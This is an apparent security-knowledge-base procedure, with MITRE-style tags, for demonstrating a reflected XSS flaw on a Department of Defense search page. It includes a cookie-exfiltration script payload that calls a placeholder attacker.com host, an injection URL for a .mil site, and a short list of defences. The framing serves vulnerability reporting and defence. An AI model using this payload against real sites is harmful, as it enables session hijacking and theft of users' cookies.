---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - xss
  - exploitation
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:30.950Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Demonstrate-Reflected-XSS-with-Malicious-Payload

## Summary

This procedure crafts and tests a malicious URL payload to exploit a reflected XSS vulnerability, demonstrating impacts such as cookie theft or page manipulation in a victim's browser.

## Description

Building on the discovered vulnerability in the Department of Defense website, this involves creating a specially formatted URL that injects JavaScript, such as accessing `document.cookie` for session hijacking. The payload executes when a user accesses the link, potentially leading to data exfiltration or unauthorized actions. It requires knowledge of JavaScript and social engineering to deliver the URL. Outcomes include proof-of-concept execution confirming the vulnerability's exploitability.

## Requirements

1. Identified vulnerable URL parameter from discovery phase
2. Text editor or proxy tool for payload crafting
3. Victim browser environment for testing

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all URL inputs server-side
- Implement HTTP-only and Secure flags on cookies to prevent JavaScript access
- Monitor for anomalous script executions via client-side logging or server-side anomaly detection

## Objectives

1. Execute arbitrary JavaScript in the target site's context
2. Simulate real impacts like stealing authentication cookies
3. Validate the vulnerability for reporting or patching

## Instructions

### Step 1: Craft Malicious Payload

**Context**: Design a JavaScript snippet that achieves the desired malicious action.

Create a payload such as `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`. Encode it if necessary to bypass basic filters, but in this case, direct injection worked due to lack of sanitization.

> The payload sends cookies to an attacker-controlled server upon execution.

### Step 2: Inject and Test Payload

**Context**: Embed the payload in the vulnerable URL parameter and access it.

Append the payload to the URL, e.g., `https://target.dod.mil/search?q=<script>alert(document.cookie)</script>`. Open in a browser and verify script execution.

> If successful, the alert shows cookies, or in a real attack, data is exfiltrated silently.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[exploitation]]
